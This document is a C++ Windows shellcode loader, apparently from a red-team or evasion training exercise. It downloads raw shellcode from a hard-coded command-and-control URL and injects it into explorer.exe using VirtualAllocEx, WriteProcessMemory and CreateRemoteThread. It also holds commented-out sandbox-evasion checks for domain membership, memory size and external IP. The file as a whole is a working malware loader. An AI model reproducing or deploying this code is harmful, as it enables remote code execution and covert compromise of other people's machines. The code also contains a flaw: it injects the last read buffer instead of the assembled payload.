#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#include <DsGetDC.h>
#pragma comment(lib, "urlmon.lib")

using namespace std;


int GetMyProcessId(wstring procname)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    while (hResult) {
        if (wstring(pe.szExeFile) == procname) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    return pid;
}

int downloadAndExecute()
{
    HANDLE hProcess;

    //Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = 551;


    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;

    wstring procname = L"explorer.exe";
    int explorerPID = GetMyProcessId(procname);
    printf("found explorer PID : %d\n", explorerPID);

    //Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);

    //Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://10.11.80.155:8000/index.raw";
    IStream* stream;

    //Update the buff[] variable to include your shellcode size
    char buff[551];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);

    while (true) {
        //Update the Read file descriptor to include your shellcode size
        stream->Read(buff, dwSize, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

BOOL checkAD()
{
    LPCWSTR dcName;
    string dcNameComp;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    cout << dcNewName;
    return (dcNewName.find("\\\\"));
}


BOOL checkMemory() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    return (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 1.00);
}

BOOL checkIP()
{
    const char* websiteURL = "http://10.10.10.10/whoami";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    return (s == "10.10.34.43");
}



int main() {

/*
    bool ad = checkAD();
    bool mem = checkMemory();
    bool ip = checkIP();

    if (ad) printf("Check AD : OK\n");
    else printf("Check AD : PROBLE\n");

    if (mem) printf("Check MEM : OK\n");
    else printf("Check MEM : PROBLEM\n");

    if (ip) printf("Check IP : OK\n");
    else printf("Check IP : PROBLEM\n");
*/

    //if (ad && mem && ip)
    {
        printf("lets wait\n");
        Sleep(100);
        printf("ok go\n");
        
        downloadAndExecute();
    }

    return 0;
}